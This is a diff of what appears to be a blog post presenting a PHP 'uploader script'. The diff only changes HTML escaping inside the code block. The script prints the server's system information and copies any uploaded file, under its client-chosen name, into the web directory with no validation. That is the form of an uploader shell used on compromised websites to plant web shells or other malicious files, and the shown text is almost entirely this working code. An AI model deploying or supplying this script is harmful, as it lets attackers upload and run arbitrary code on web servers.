@@ -18,12 +18,12 @@ This is a very basic uploader script, which simply enables the user to upload wh
 ### Uploader Script Source Code
 
 {% highlight php linenos %}<?php
-echo '&lt;b&gt;&lt;br&gt;&lt;br&gt;'.php_uname().'&lt;br&gt;&lt;/b&gt;';
-echo '&lt;form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader"&gt;';
-echo '&lt;input type="file" name="file" size="50"&gt;&lt;input name="_upl" type="submit" id="_upl" value="Upload"&gt;&lt;/form&gt;';
+echo '<b><br><br>'.php_uname().'<br></b>';
+echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
+echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
 if( $_POST['_upl'] == "Upload" ) {
-    if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '&lt;b&gt;Upload SUKSES !!!&lt;/b&gt;&lt;br&gt;&lt;br&gt;'; }
-    else { echo '&lt;b&gt;Upload GAGAL !!!&lt;/b&gt;&lt;br&gt;&lt;br&gt;'; }
+    if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Upload SUKSES !!!</b><br><br>'; }
+    else { echo '<b>Upload GAGAL !!!</b><br><br>'; }
 }
 ?>
 {% endhighlight %}
